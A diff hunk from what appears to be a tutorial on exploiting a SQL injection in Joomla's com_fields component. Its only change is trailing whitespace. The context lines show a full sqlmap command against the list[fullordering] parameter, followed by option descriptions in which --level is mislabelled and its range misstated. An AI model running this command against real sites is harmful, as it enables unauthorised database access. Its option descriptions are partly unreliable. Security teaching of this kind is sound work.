@@ -343,7 +343,7 @@ Using Sqlmap:
 sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 ```  
 `--risk=RISK` Risk of tests to perform (1-3, default 1, 2=time-based SQL injection, 3=OR-based SQL injection)  
-`--level=LEVEL` Risk of tests to perform (1-3, default 1, 2=test Cookie, 3=test User-Agen header and Referer header) 
+`--level=LEVEL` Risk of tests to perform (1-3, default 1, 2=test Cookie, 3=test User-Agen header and Referer header)   
 `--dbs` Enumerate DBMS databases  
 `-p TESTPARAMETER` Testable parameter(s) (Attack target parameter)  
 ```
